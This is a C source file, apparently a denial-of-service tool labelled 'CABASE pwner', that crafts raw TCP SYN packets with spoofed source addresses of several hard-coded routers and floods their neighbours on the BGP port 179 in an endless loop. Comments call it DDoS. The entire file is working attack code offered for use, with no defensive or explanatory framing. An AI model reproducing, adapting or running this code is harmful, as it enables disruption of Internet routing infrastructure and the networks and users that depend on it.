#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <signal.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>

int tcpsend(u_int saddr, u_int daddr, unsigned short sport,
                 unsigned short dport, char *data,
                 unsigned short datalen);
unsigned short in_cksum(unsigned short *ptr, int nbytes);
int sockfd;
struct pseudohdr{
        unsigned long saddr;
        unsigned long daddr;
        char useless;
        unsigned char protocol;
        unsigned short length;
};
struct paquetes{
        char* packet;
        unsigned short packet_size;
        unsigned long daddr;
        sockaddr_in sock;
        unsigned short sockaddr_in_size;
};
unsigned int ALAN=0;
paquetes CASALAN[9999999];
#define PHI 0xaaf219b9
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x) {
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++) {
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
  }
}

uint32_t rand_cmwc(void) {
  uint64_t t, a = 18782LL;
  static uint32_t i = 4095;
  uint32_t x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (t >> 32);
  x = t + c;
  if (x < c) {
    x++;
    c++;
  }
  return (Q[i] = r - x);
}


int main(int argc, char **argv){
init_rand(time(NULL));
        int on = 1;
        sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
        setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on));
        unsigned long rs[5];
        unsigned short srcp;
        unsigned short dstp;
rs[0]=inet_addr("200.0.17.1");
rs[1]=inet_addr("200.0.17.2");
rs[2]=inet_addr("45.68.8.254");
rs[3]=inet_addr("45.68.11.254");
rs[4]=inet_addr("45.68.8.12");

dstp=179;//Puerto BGP
printf("# CABASE pwner by Alan Sardon\n");
//Computize Packets
unsigned long A;
char ip_buffer[16];
char *payload = 0;
unsigned short payload_len = 0;
int i;int j;
for(i=1;i<255;i++){
for(j=0;j<5;j++){
srcp=rand_cmwc() % 65534+1;
snprintf(ip_buffer, sizeof(ip_buffer), "200.0.17.%d", i);
tcpsend(rs[j],inet_addr(ip_buffer),srcp,dstp,payload,payload_len);
ALAN++;

srcp=rand_cmwc() % 65534+1;
snprintf(ip_buffer, sizeof(ip_buffer), "45.68.8.%d", i);
tcpsend(rs[j],inet_addr(ip_buffer),srcp,dstp,payload,payload_len);
ALAN++;

}}
//Ya estan los paquetesd calculaDDoS
printf("A MITIG.AR\n");
while(true){
for(A=0;A<ALAN;A++){
sendto(sockfd, CASALAN[A].packet, CASALAN[A].packet_size, 0, (const sockaddr*) &CASALAN[A].sock,CASALAN[A].sockaddr_in_size);
}
printf("6\n");
sleep(1);
}
return 0;
}

int tcpsend (unsigned int saddr, unsigned int daddr, unsigned short sport,unsigned short dport, char *data, unsigned short datalen){
        char *packet;
        struct iphdr *ip;
        struct tcphdr *tcp;
        struct pseudohdr *pseudo;
        struct sockaddr_in servaddr;
        int retval;
        int on = 1;
        int packet_size = (sizeof (struct iphdr) +
                                   sizeof (struct tcphdr) +
                                   datalen) * sizeof (char);

        packet = (char *) malloc (packet_size);

        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons (dport);
        servaddr.sin_addr.s_addr = daddr;
        memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));

        ip = (struct iphdr *) packet;
        tcp = (struct tcphdr *) (packet + sizeof (struct iphdr));
        pseudo = (struct pseudohdr *) (packet + sizeof (struct iphdr) -
                                       sizeof (struct pseudohdr));
        memset (packet, 0, packet_size);
        pseudo->saddr = saddr;
        pseudo->daddr = daddr;
        pseudo->protocol = IPPROTO_TCP;
        pseudo->length = htons (sizeof (struct tcphdr));
        tcp->source = htons (sport);
        tcp->dest = htons (dport);
        tcp->seq = htonl(1);
//tcp->seq = htonl(0x020405B4);
        tcp->ack_seq = 0;
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->ack = 0;
    tcp->check = 0; // Done by kernel
    tcp->rst = 0;
    tcp->urg_ptr = 0;
        tcp->window = htons (0xD0F1);
        tcp->check =
                in_cksum ((unsigned short *) pseudo,
                          sizeof (struct tcphdr) + sizeof (struct pseudohdr));

        ip->version = 4;
        ip->ihl = 5;
        ip->tot_len = htons (packet_size);
        ip->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        ip->ttl = 255;
        ip->tos = 16;
        ip->frag_off = 0;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = saddr;
        ip->daddr = daddr;
        ip->check = in_cksum ((unsigned short *) ip, sizeof (struct iphdr));
CASALAN[ALAN].packet=packet;
CASALAN[ALAN].packet_size=packet_size;
CASALAN[ALAN].sock=servaddr;
CASALAN[ALAN].sockaddr_in_size=sizeof(servaddr);
//      sendto (sockfd, packet, packet_size, 0, (const sockaddr*) &servaddr, sizeof (servaddr));
ALAN++;
        return 0;
}

unsigned short in_cksum (unsigned short *ptr, int nbytes){
        register long sum;
        u_short oddbyte;
        register u_short answer;
        sum = 0;
        while (nbytes > 1) {
                sum += *ptr++;
                nbytes -= 2;
        }
        if (nbytes == 1) {
                oddbyte = 0;
                *((u_char *) & oddbyte) = *(u_char *) ptr;
                sum += oddbyte;
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;

        return (answer);
}
